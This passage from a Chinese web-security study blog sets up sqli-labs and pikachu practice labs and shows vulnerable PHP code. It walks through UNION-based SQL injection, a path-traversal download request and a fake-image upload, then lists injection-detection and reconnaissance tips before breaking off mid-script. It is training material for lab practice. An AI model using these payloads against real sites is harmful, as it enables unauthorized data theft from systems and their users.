src="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/3.png"><br><img src="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/4.png"><br><img src="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/5.png"></p><h3 id="五、sql注入靶场搭建"><a href="#五、sql注入靶场搭建" class="headerlink" title="五、sql注入靶场搭建"></a><font size="5"><strong>五、sql注入靶场搭建</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@oldjiang ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker pull acgpiano/sqli-labs</span><span class="token punctuation">[</span>root@oldjiang ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker run -dt --name sqli -p 80:80 -p 13306:3306 --rm acgpiano/sqli-labs</span><span class="token punctuation">[</span>root@oldjiang ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker exec -it sqli /bin/bash</span></code></pre><p><strong>●访问</strong><br><img src="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/6.png"><br><img src="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/7.png"><br><strong>●查看源代码</strong></p><pre class=" language-bash"><code class="language-bash">root@1f9ac3840241:/<span class="token comment" spellcheck="true"># cat /var/www/html/Less-2/index.php</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html PUBLIC <span class="token string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="token string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="token operator">></span><span class="token operator">&lt;</span>html xmlns<span class="token operator">=</span><span class="token string">"http://www.w3.org/1999/xhtml"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span><span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"Content-Type"</span> content<span class="token operator">=</span><span class="token string">"text/html; charset=utf-8"</span> /<span class="token operator">></span><span class="token operator">&lt;</span>title<span class="token operator">></span>Less-2 **Error Based- Intiger**<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>body bgcolor<span class="token operator">=</span><span class="token string">"#000000"</span><span class="token operator">></span><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">" margin-top:60px;color:#FFF; font-size:23px; text-align:center"</span><span class="token operator">></span>Welcome<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token operator">&lt;</span>font color<span class="token operator">=</span><span class="token string">"#FF0000"</span><span class="token operator">></span> Dhakkan <span class="token operator">&lt;</span>/font<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>font size<span class="token operator">=</span><span class="token string">"3"</span> color<span class="token operator">=</span><span class="token string">"#FFFF00"</span><span class="token operator">></span><span class="token operator">&lt;</span>?php//including the Mysql connect parameters.include<span class="token punctuation">(</span><span class="token string">"../sql-connections/sql-connect.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>error_reporting<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>// take the variablesif<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>//logging the connection parameters to a <span class="token function">file</span> <span class="token keyword">for</span> analysis.<span class="token variable">$fp</span><span class="token operator">=</span>fopen<span class="token punctuation">(</span><span class="token string">'result.txt'</span>,<span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fwrite<span class="token punctuation">(</span><span class="token variable">$fp</span>,<span class="token string">'ID:'</span><span class="token keyword">.</span><span class="token variable">$id</span><span class="token keyword">.</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fclose<span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>// connectivity<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span>mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> mysql_fetch_array<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;font size='5' color= '#99FF00'>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'Your Login name:'</span><span class="token keyword">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'Your Password:'</span> <span class="token keyword">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token keyword">else</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#FFFF00">'</span><span class="token punctuation">;</span>        print_r<span class="token punctuation">(</span>mysql_error<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token keyword">else</span>                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                <span class="token keyword">echo</span> <span class="token string">"Please input the ID as parameter with numeric value"</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>/font<span class="token operator">></span> <span class="token operator">&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span>/br<span class="token operator">></span><span class="token operator">&lt;</span>/br<span class="token operator">></span><span class="token operator">&lt;</span>/br<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"../images/Less-2.jpg"</span> /<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre><p><strong>备注：</strong>在上面的代码中可以看到$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1”;直接传递的变量$id带入sql语句中执行没有做任何的限制，这样为恶意代码插入执行创造了条件。通过修改带入的代码执行的语句最终达到SQL注入获取敏感信息</p><p><strong>● 在数据库中执行:</strong><br>id&#x3D;-1 是为了让回显的结果为空执行后面union的字句。</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>+----+----------+------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password   <span class="token operator">|</span>+----+----------+------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb       <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> Angelina <span class="token operator">|</span> I-kill-you <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> Dummy    <span class="token operator">|</span> p@ssword   <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> secure   <span class="token operator">|</span> crappy     <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> stupid   <span class="token operator">|</span> stupidity  <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> superman <span class="token operator">|</span> genious    <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> batman   <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span><span class="token operator">|</span>  8 <span class="token operator">|</span> admin    <span class="token operator">|</span> admin      <span class="token operator">|</span><span class="token operator">|</span>  9 <span class="token operator">|</span> admin1   <span class="token operator">|</span> admin1     <span class="token operator">|</span><span class="token operator">|</span> 10 <span class="token operator">|</span> admin2   <span class="token operator">|</span> admin2     <span class="token operator">|</span><span class="token operator">|</span> 11 <span class="token operator">|</span> admin3   <span class="token operator">|</span> admin3     <span class="token operator">|</span><span class="token operator">|</span> 12 <span class="token operator">|</span> dhakkan  <span class="token operator">|</span> dumbo      <span class="token operator">|</span><span class="token operator">|</span> 14 <span class="token operator">|</span> admin4   <span class="token operator">|</span> admin4     <span class="token operator">|</span>+----+----------+------------+13 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> * from emails<span class="token punctuation">;</span>+----+------------------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> email_id               <span class="token operator">|</span>+----+------------------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb@dhakkan.com       <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> Angel@iloveu.com       <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> Dummy@dhakkan.local    <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> secure@dhakkan.local   <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> stupid@dhakkan.local   <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> superman@dhakkan.local <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> batman@dhakkan.local   <span class="token operator">|</span><span class="token operator">|</span>  8 <span class="token operator">|</span> admin@dhakkan.com      <span class="token operator">|</span>+----+------------------------+8 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 LIMIT 0,1<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#显示的结果为空、因为没有id=-1的字段</span>Empty <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union  <span class="token keyword">select</span> 1,email_id,3 from emails LIMIT 0,1<span class="token punctuation">;</span>+----+------------------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username         <span class="token operator">|</span> password <span class="token operator">|</span>+----+------------------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb@dhakkan.com <span class="token operator">|</span> 3        <span class="token operator">|</span>+----+------------------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><p><strong>● 在网页中执行</strong><br>%20在网页的URL编码中为空格，在id&#x3D;-2添加代码：union  select 1,email_id,3 from emails</p><p><img src="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/8.png"></p><p><strong>总结：</strong>可控变量，带入数据库查询，变量未存在过滤或过滤不严谨。</p><p>测试题:参数x有注入，以下那个注入测试正确?</p><pre class=" language-bash"><code class="language-bash">a. www.xiaodi8.com/news.php?y<span class="token operator">=</span>1 and 1<span class="token operator">=</span>1<span class="token operator">&amp;</span>x<span class="token operator">=</span>2b. www.xiaodi8.com/news.php?y<span class="token operator">=</span>1<span class="token operator">&amp;</span>x<span class="token operator">=</span>2 and 1<span class="token operator">=</span>1c. www .xiaodi8.com/news.php?y<span class="token operator">=</span>1 and 1<span class="token operator">=</span>1<span class="token operator">&amp;</span>x<span class="token operator">=</span>2 and 1<span class="token operator">=</span>1d. www .xiaodi8.com/news.php?xx<span class="token operator">=</span>1 and 1<span class="token operator">=</span>1<span class="token operator">&amp;</span>xxx<span class="token operator">=</span>2 and 1<span class="token operator">=</span>1</code></pre><p><strong>●判断是否存在注入点</strong></p><pre class=" language-bash"><code class="language-bash">1、逻辑值    and 1 <span class="token operator">=</span> 1页面正常    and 1 <span class="token operator">=</span> 2页面异常    则可能存在注入点2、order by        通过order by 判断注入的字段数</code></pre><p><strong>●信息收集</strong></p><pre class=" language-bash"><code class="language-bash">数据库版本：version<span class="token punctuation">(</span><span class="token punctuation">)</span>数据库名字：database<span class="token punctuation">(</span><span class="token punctuation">)</span>数据库用户：user<span class="token punctuation">(</span><span class="token punctuation">)</span>操作系统：@@version_compile_os</code></pre><p><strong>●版本探测的意义</strong></p><pre class=" language-bash"><code class="language-bash">在mysql5.0以后的版本存在一个information_schema数据库、里面存储记录数据库名、表名、列名的数据库相当于可以通过information_schema这个数据库获取到数据库下面的表名和列名。</code></pre><p><strong>●获取相关信息</strong></p><pre class=" language-bash"><code class="language-bash">information_schema.tables<span class="token comment" spellcheck="true">#information_schema下面的所有表名</span>information_schema.columns<span class="token comment" spellcheck="true">#information_schema下面所有的列名</span>table_name<span class="token comment" spellcheck="true">#表名</span>column_name<span class="token comment" spellcheck="true">#列名</span>table_schema<span class="token comment" spellcheck="true">#数据库名</span></code></pre><h3 id="六、涉及资源："><a href="#六、涉及资源：" class="headerlink" title="六、涉及资源："></a><font size="5"><strong>六、涉及资源：</strong></font></h3><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>忍者安全测试系统-禁用软盘安装<br><a href="https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-011</title>
      <link href="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/"/>
      <url>/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-必懂知识点"><a href="#WEB漏洞-必懂知识点" class="headerlink" title="WEB漏洞-必懂知识点"></a><font size="6"><strong>WEB漏洞-必懂知识点</strong></font></h2><span id="more"></span><h3 id="一、前言知识"><a href="#一、前言知识" class="headerlink" title="一、前言知识"></a><font size="5"><strong>一、前言知识</strong></font></h3><p>前言:本章节将讲解各种WEB层面上的有那些漏洞类型,俱体漏洞的危害等级，以简要的影响范围测试进行实例分析，思维导图中的漏洞也是后面我们将要学习到的各个知识点，其中针对漏洞的形成原理，如何发现，如何利用将是本章节学习的重点内容!<br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/1.png"></p><p>简要知识点</p><pre class=" language-bash"><code class="language-bash">CTE,SRc，红蓝对抗，实战等<span class="token comment" spellcheck="true">#简要说明以上漏洞危害情况</span><span class="token comment" spellcheck="true">#简要说明以上漏洞等级划分</span><span class="token comment" spellcheck="true">#简要说明以上漏洞重点内容</span><span class="token comment" spellcheck="true">#简要说明以上漏洞形势问题</span></code></pre><h3 id="二、pikachu环境搭建"><a href="#二、pikachu环境搭建" class="headerlink" title="二、pikachu环境搭建"></a><font size="5"><strong>二、pikachu环境搭建</strong></font></h3><p>靶场搭建：<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a><br>docker环境</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@oldjiang ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker pull area39/pikachu</span><span class="token punctuation">[</span>root@oldjiang ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker run -d -p8080:80 area39/pikachu</span>72ddd9a05d31fdb921765519c413f3f97dbb34560c9c14d9aa59de73e5d6b3eb</code></pre><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/2.png"><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/3.png"><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/4.png"></p><h3 id="三、sql注入之数字注入"><a href="#三、sql注入之数字注入" class="headerlink" title="三、sql注入之数字注入"></a><font size="5"><strong>三、sql注入之数字注入</strong></font></h3><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/5.png"><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/6.png"><br>在数据库中查看信息</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from member<span class="token punctuation">;</span>+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> pw                               <span class="token operator">|</span> sex  <span class="token operator">|</span> phonenum    <span class="token operator">|</span> address               <span class="token operator">|</span> email             <span class="token operator">|</span>+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> vince    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> boy  <span class="token operator">|</span> 18626545453 <span class="token operator">|</span> chain                 <span class="token operator">|</span> vince@pikachu.com <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> allen    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> boy  <span class="token operator">|</span> 13676767767 <span class="token operator">|</span> nba 76                <span class="token operator">|</span> allen@pikachu.com <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> kobe     <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> boy  <span class="token operator">|</span> 15988767673 <span class="token operator">|</span> nba lakes             <span class="token operator">|</span> kobe@pikachu.com  <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> grady    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> boy  <span class="token operator">|</span> 13676765545 <span class="token operator">|</span> nba hs                <span class="token operator">|</span> grady@pikachu.com <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> kevin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> boy  <span class="token operator">|</span> 13677676754 <span class="token operator">|</span> Oklahoma City Thunder <span class="token operator">|</span> kevin@pikachu.com <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> lucy     <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> girl <span class="token operator">|</span> 12345678922 <span class="token operator">|</span> usa                   <span class="token operator">|</span> lucy@pikachu.com  <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> lili     <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> girl <span class="token operator">|</span> 18656565545 <span class="token operator">|</span> usa                   <span class="token operator">|</span> lili@pikachu.com  <span class="token operator">|</span>+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+</code></pre><p>操作方法<br>● 在文件&#x2F;app&#x2F;vul&#x2F;sqli&#x2F;sqli_id.php第27行下面增加一行 echo $query; 然后保存退出</p><pre class=" language-bash"><code class="language-bash">27 <span class="token variable">$query</span><span class="token operator">=</span><span class="token string">"select username,email from member where id=<span class="token variable">$id</span>"</span><span class="token punctuation">;</span>28  <span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">;</span></code></pre><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/7.png"><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/8.png"><br>打开burp修改数据包<br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/9.png"><br>获取到数据库信息<br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/10.png"></p><h3 id="四、文件遍历漏洞"><a href="#四、文件遍历漏洞" class="headerlink" title="四、文件遍历漏洞"></a><font size="5"><strong>四、文件遍历漏洞</strong></font></h3><p>创建文件dir.php</p><pre class=" language-bash"><code class="language-bash">root@eb8d8fc8a3e7:/app<span class="token comment" spellcheck="true"># pwd</span>/approot@eb8d8fc8a3e7:/app<span class="token comment" spellcheck="true"># vim dir.php</span>root@eb8d8fc8a3e7:/app<span class="token comment" spellcheck="true"># pwd</span>/approot@eb8d8fc8a3e7:/app<span class="token comment" spellcheck="true"># cat dir.php</span><span class="token operator">&lt;</span>?php<span class="token keyword">function</span> my_dir<span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span>@<span class="token variable">$handle</span> <span class="token operator">=</span> opendir<span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                <span class="token keyword">while</span><span class="token variable"><span class="token punctuation">((</span>$file <span class="token operator">=</span> readdir<span class="token punctuation">(</span>$handle<span class="token punctuation">))</span></span> <span class="token operator">!=</span><span class="token operator">=</span> false<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                        if<span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string">".."</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                                if<span class="token punctuation">(</span>is_dir<span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token keyword">.</span> <span class="token string">"/"</span> <span class="token keyword">.</span> <span class="token variable">$file</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; //如果是子文件夹，进行递归</span>                                        <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token punctuation">]</span> <span class="token operator">=</span> my_dir<span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token keyword">.</span> <span class="token string">"/"</span> <span class="token keyword">.</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>                                        <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>                                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>                        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        closedir<span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token keyword">return</span> <span class="token variable">$files</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token keyword">echo</span> <span class="token string">"&lt;pre>"</span><span class="token punctuation">;</span>print_r<span class="token punctuation">(</span>my_dir<span class="token punctuation">(</span><span class="token string">"../app"</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/pre>"</span><span class="token punctuation">;</span>root@eb8d8fc8a3e7:/app<span class="token comment" spellcheck="true"># chmod +x dir.php</span></code></pre><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/11.png"><br>备注：目录遍历漏洞一般由其他的漏洞配合才能实现漏洞的作用。</p><h3 id="五、文件上传漏洞"><a href="#五、文件上传漏洞" class="headerlink" title="五、文件上传漏洞"></a><font size="5"><strong>五、文件上传漏洞</strong></font></h3><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/12.png"></p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># cat phpinfo.jpg                                                                                                                                                                     2 ⚙</span><span class="token operator">&lt;</span>?phpphpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/13.png"><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/14.png"><br>注意：文件上传一般是高危漏洞，因为要是上传的是木马文件可以直接拿下服务器。</p><p>五、文件下载漏洞<br>右击复制下载地址：<a href="http://10.1.1.133:8080/vul/unsafedownload/execdownload.php?filename=kb.png">http://10.1.1.133:8080/vul/unsafedownload/execdownload.php?filename=kb.png</a><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/15.png"><br>在网站目录中查看</p><pre class=" language-bash"><code class="language-bash">root@eb8d8fc8a3e7:/app/vul/unsafedownload/download<span class="token comment" spellcheck="true"># pwd</span>/app/vul/unsafedownload/downloadroot@eb8d8fc8a3e7:/app/vul/unsafedownload/download<span class="token comment" spellcheck="true"># ls</span>ai.png  bigben.png  camby.png  kb.png  lmx.png  mbl.png  ns.png  oldfish.png  pj.png  rayal.png  sks.png  smallane.png</code></pre><p>修改下载文件</p><pre class=" language-bash"><code class="language-bash">http://10.1.1.133:8080/vul/unsafedownload/execdownload.php?filename<span class="token operator">=</span><span class="token punctuation">..</span>/unsafedownload.php</code></pre><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/16.png"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-010</title>
      <link href="/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/"/>
      <url>/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集-资产监控拓展"><a href="#信息收集-资产监控拓展" class="headerlink" title="信息收集-资产监控拓展"></a><font size="6"><strong>信息收集-资产监控拓展</strong></font></h2><span id="more"></span><p><img src="/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/1.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Github监控</span>  便于收集整理最新exp或poc  便于发现相关测试目标的资产<span class="token comment" spellcheck="true"># 各种子域名查询</span><span class="token comment" spellcheck="true"># DNS,备案,证书</span><span class="token comment" spellcheck="true"># 全球节点请求cdn</span>  枚举爆破或解析子域名对应  便于发现管理员相关的注册信息<span class="token comment" spellcheck="true">#黑暗引擎相关搜索</span>    fofa, shodan, zoomeye  <span class="token comment" spellcheck="true">#微信公众号接口获取</span><span class="token comment" spellcheck="true"># 内部群内部资源</span></code></pre><h3 id="一、GitHub项目监控"><a href="#一、GitHub项目监控" class="headerlink" title="一、GitHub项目监控"></a><font size="5"><strong>一、GitHub项目监控</strong></font></h3><p>server酱：<a href="http://sc.ftqq.com/3.version">http://sc.ftqq.com/3.version</a><br>GitHub项目监控地址：<a href="https://github.com/weixiao9188/wechat_push">https://github.com/weixiao9188/wechat_push</a></p><h4 id="1、监控最新的EXP发布及其他"><a href="#1、监控最新的EXP发布及其他" class="headerlink" title="1、监控最新的EXP发布及其他"></a><font size="4"><strong>1、监控最新的EXP发布及其他</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Title: wechat push CVE-2020</span><span class="token comment" spellcheck="true"># Date: 2020-5-9</span><span class="token comment" spellcheck="true"># Exploit Author: weixiao9188</span><span class="token comment" spellcheck="true"># Version: 4.0</span><span class="token comment" spellcheck="true"># Tested on: Linux,windows</span><span class="token comment" spellcheck="true"># coding:UTF-8</span><span class="token function">import</span> requests<span class="token function">import</span> json<span class="token function">import</span> <span class="token function">time</span><span class="token function">import</span> os<span class="token function">import</span> pandas as pdtime_sleep <span class="token operator">=</span> 20 <span class="token comment" 